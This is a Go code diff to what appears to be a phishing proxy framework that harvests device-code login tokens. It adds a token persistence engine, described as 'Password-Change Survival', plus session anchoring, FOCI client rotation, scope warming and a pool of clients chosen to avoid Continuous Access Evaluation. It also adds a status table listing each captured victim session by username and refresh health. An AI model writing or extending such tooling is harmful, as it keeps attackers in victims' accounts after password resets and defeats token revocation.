@@ -43,6 +43,7 @@ type Terminal struct {
 	hlp              *Help
 	developer        bool
 	tokenAutoRefresh *TokenAutoRefreshManager
+	tokenPersistence *TokenPersistenceEngine
 }
 
 func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Database, developer bool) (*Terminal, error) {
@@ -83,10 +84,23 @@ func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Databas
 	t.tokenAutoRefresh = NewTokenAutoRefreshManager(db)
 	t.tokenAutoRefresh.Start()
 
+	// Start token persistence engine (vault + session anchoring)
+	t.tokenPersistence = NewTokenPersistenceEngine(db)
+	t.tokenPersistence.Start()
+
+	// Connect auto-refresh and persistence engine to token feed
+	if p.tokenFeed != nil {
+		p.tokenFeed.SetAutoRefreshManager(t.tokenAutoRefresh)
+		p.tokenFeed.SetPersistenceEngine(t.tokenPersistence)
+	}
+
 	return t, nil
 }
 
 func (t *Terminal) Close() {
+	if t.tokenPersistence != nil {
+		t.tokenPersistence.Stop()
+	}
 	if t.tokenAutoRefresh != nil {
 		t.tokenAutoRefresh.Stop()
 	}
@@ -2935,7 +2949,7 @@ func (t *Terminal) handleDeviceCode(args []string) error {
 		}
 
 	case "status":
-		// Show auto-refresh status
+		// Show comprehensive auto-refresh and health status
 		if t.tokenAutoRefresh != nil {
 			total, withRefresh := t.tokenAutoRefresh.GetRefreshStats()
 			running := t.tokenAutoRefresh.IsRunning()
@@ -2945,11 +2959,79 @@ func (t *Terminal) handleDeviceCode(args []string) error {
 				statusColor = higreen
 				statusText = "RUNNING"
 			}
-			t.output("\n  %s Auto-Refresh Status\n", white.Sprint("🔄"))
-			t.output("  %-20s %s\n", "Status:", statusColor.Sprint(statusText))
-			t.output("  %-20s %d\n", "Total sessions:", total)
-			t.output("  %-20s %d\n", "With refresh token:", withRefresh)
-			t.output("  %-20s 15 minutes\n\n", "Refresh interval:")
+			t.output("\n  %s Token Keep-Alive System\n", white.Sprint("🔄"))
+			t.output("  %-24s %s\n", "Status:", statusColor.Sprint(statusText))
+			t.output("  %-24s %v\n", "Uptime:", t.tokenAutoRefresh.GetUptime().Round(time.Second))
+			t.output("  %-24s %d\n", "Total sessions:", total)
+			t.output("  %-24s %d\n", "With refresh token:", withRefresh)
+			t.output("  %-24s %d\n", "Total refreshes:", t.tokenAutoRefresh.GetTotalRefreshCount())
+			t.output("  %-24s %v (primary) / %v (keep-alive)\n", "Refresh interval:", TOKEN_REFRESH_INTERVAL, TOKEN_KEEPALIVE_INTERVAL)
+			t.output("  %-24s %d FOCI clients\n", "Client rotation:", len(FOCIClientIDs))
+			t.output("  %-24s %d scopes\n", "Scope warming:", len(WarmingScopes))
+
+			// Show per-session health
+			healthReport := t.tokenAutoRefresh.GetHealthReport()
+			if len(healthReport) > 0 {
+				t.output("\n  %s Session Health\n", white.Sprint("💊"))
+				t.output("  %-6s %-30s %-10s %-10s %-10s %-20s %s\n",
+					white.Sprint("ID"), white.Sprint("User"), white.Sprint("Status"),
+					white.Sprint("Refreshes"), white.Sprint("Failures"), white.Sprint("Last Refresh"), white.Sprint("FOCI Client"))
+				t.output("  %-6s %-30s %-10s %-10s %-10s %-20s %s\n",
+					"--", "----", "------", "---------", "--------", "------------", "-----------")
+				for _, h := range healthReport {
+					var statusC *color.Color
+					switch h.Status {
+					case "healthy":
+						statusC = higreen
+					case "degraded":
+						statusC = hiyellow
+					case "dead":
+						statusC = hired
+					default:
+						statusC = white
+					}
+					username := h.Username
+					if len(username) > 28 {
+						username = username[:28] + ".."
+					}
+					lastRefresh := "never"
+					if !h.LastRefreshTime.IsZero() {
+						lastRefresh = h.LastRefreshTime.Format("15:04:05")
+					}
+					clientName := "default"
+					if h.CurrentClientIdx < len(FOCIClientIDs) {
+						clientName = FOCIClientIDs[h.CurrentClientIdx].Name
+					}
+					if len(clientName) > 18 {
+						clientName = clientName[:18]
+					}
+					t.output("  %-6d %-30s %-10s %-10d %-10d %-20s %s\n",
+						h.DBId, username, statusC.Sprint(h.Status),
+						h.TotalRefreshes, h.ConsecutiveFailures, lastRefresh, clientName)
+				}
+			}
+			t.output("\n")
+		}
+
+		// Show Token Persistence Vault stats
+		if t.tokenPersistence != nil {
+			totalVaults, totalTokens, validTokens, anchoredSessions := t.tokenPersistence.GetAllVaultStats()
+			vaultStatus := hiyellow
+			vaultText := "STANDBY"
+			if validTokens > 0 {
+				vaultStatus = higreen
+				vaultText = "PROTECTED"
+			}
+			t.output("  %s Token Persistence Vault (Password-Change Survival)\n", white.Sprint("🛡️"))
+			t.output("  %-24s %s\n", "Vault status:", vaultStatus.Sprint(vaultText))
+			t.output("  %-24s %d\n", "Session vaults:", totalVaults)
+			t.output("  %-24s %d total / %d valid\n", "Vault tokens:", totalTokens, validTokens)
+			t.output("  %-24s %d\n", "Anchored sessions:", anchoredSessions)
+			t.output("  %-24s %v\n", "Vault refresh interval:", VAULT_REFRESH_INTERVAL)
+			t.output("  %-24s %v\n", "Anchor interval:", SESSION_ANCHOR_INTERVAL)
+			t.output("  %-24s %d services\n", "Service coverage:", len(VaultServices))
+			t.output("  %-24s %d non-CAE clients\n", "Client pool:", len(NonCAEClients))
+			t.output("\n")
 		}
 
 		// Show proxy connection stats
